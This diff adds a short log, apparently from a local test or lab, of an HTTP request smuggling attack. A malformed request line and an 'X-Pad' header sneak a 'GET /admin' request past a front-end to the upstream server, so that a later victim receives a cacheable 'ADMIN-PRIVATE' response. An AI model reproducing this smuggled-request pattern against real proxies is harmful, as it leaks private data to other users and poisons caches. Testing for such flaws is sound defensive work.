@@ -1,0 +1,10 @@
+ATTACKER -> b'HTTP/1.1 200 OK\r\nContent-Length: 5\r\nConnection: keep-alive\r\n\r\nCLEAN'
+VICTIM-1 -> b'HTTP/1.1 200 OK\r\ncache-control: public, max-age=60\r\nContent-Length: 13\r\nConnection: keep-alive\r\n\r\nADMIN-PRIVATE'
+VICTIM-2 -> b'HTTP/1.1 200 OK\r\nContent-Length: 6\r\nConnection: keep-alive\r\n\r\nLATER!'
+--- upstream parsed 4 heads ---
+ 1: 'GET /x\r\nHost: up'
+ 2: 'GET /admin HTTP/1.1\r\nHost: up\r\nX-Pad:  HTTP/1.1\r\nHost: 127.0.0.1:18471\r\nConnection: keep-alive'
+ 3: 'GET /victim HTTP/1.1\r\nHost: 127.0.0.1:18471\r\nConnection: keep-alive'
+ 4: 'GET /other HTTP/1.1\r\nHost: 127.0.0.1:18471\r\nConnection: keep-alive'
+--- srvlog ---
+
